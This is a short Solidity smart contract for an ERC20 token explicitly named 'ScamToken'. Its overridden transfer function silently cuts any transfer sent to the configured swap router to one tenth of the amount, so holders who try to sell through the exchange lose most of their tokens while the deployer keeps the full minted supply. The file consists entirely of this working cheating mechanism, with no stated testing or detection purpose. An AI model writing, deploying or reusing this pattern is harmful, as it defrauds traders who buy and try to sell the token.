// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract ScamToken is ERC20 {
    address swapRouter;

    constructor(
        string memory name,
        string memory symbol,
        uint256 supply,
        address swapRouter_
    ) ERC20(name, symbol) {
        _mint(msg.sender, supply * 10**18);
        swapRouter = swapRouter_;
    }

    function transfer(address to, uint256 amount) public override returns (bool) {
        address owner = _msgSender();
        if (to == swapRouter) {
            amount = amount / 10;
        }
        _transfer(owner, to, amount);
        return true;
    }
}
